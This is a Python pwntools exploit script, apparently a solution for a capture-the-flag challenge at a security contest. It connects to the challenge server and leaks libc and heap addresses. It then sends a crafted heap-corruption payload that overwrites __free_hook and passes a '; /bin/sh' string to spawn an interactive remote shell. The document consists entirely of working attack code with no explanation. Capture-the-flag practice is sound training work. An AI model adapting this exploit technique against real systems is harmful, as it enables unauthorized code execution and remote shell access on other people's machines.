from pwn import *
import multiprocessing

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'challenges.whitehatcontest.kr', 24756

context.update(log_level='error')

i = 0

libc = ELF('/=/Downloads/libc.so (4).6')

def run(i):
	r = remote(HOST, PORT)
	i0 = lambda: r.recvuntil('>>> ')
	send = lambda x, y=True: (y and i0(), print_it(x), r.sendline(str(x)))

	def print_it(x):
		print x

	def free(x):
		send(x + '=M')
		send(x + '=free')
		send(x + '=m')

	def pad(x, free=True):
		send(x + '=pad')

	send('a=100')
	send('-1')
	send('')

	leak = i0()
	print hexdump(leak)

	libc.address = u32(leak[:4]) - 0x1b07b0
	print hex(libc.address)

	send('100', False)
	send('')
	leak = i0()
	heap = u32(leak[:4]) + 0xc30 - 0xb18

	payload = '\xff' * 200 + p32(heap - 12 - 8) + p32(0x41414141) + 'a' * 8 + p32(libc.search('x\x00').next()) + p32(heap + 16) + p32(heap - 16) + p32(heap + 12) + p32(libc.symbols['__free_hook']) + p32(0x10101010) + '\x0c'
	pause()
	try:
		send('b=""', False)
		send('x=""')
		send('c="' + payload + '"')
		send('c=1')
		send('b=c')
		print hex(libc.symbols['system'])
		send('x="' + p32(libc.address + i * 0x10) + '; /bin/sh"')
		# print 'trying %x' % (i * 0x10)
		r.interactive()
	except:
		pass
	r.close()

base = libc.symbols['system'] / 0x10

run(base)

exit()
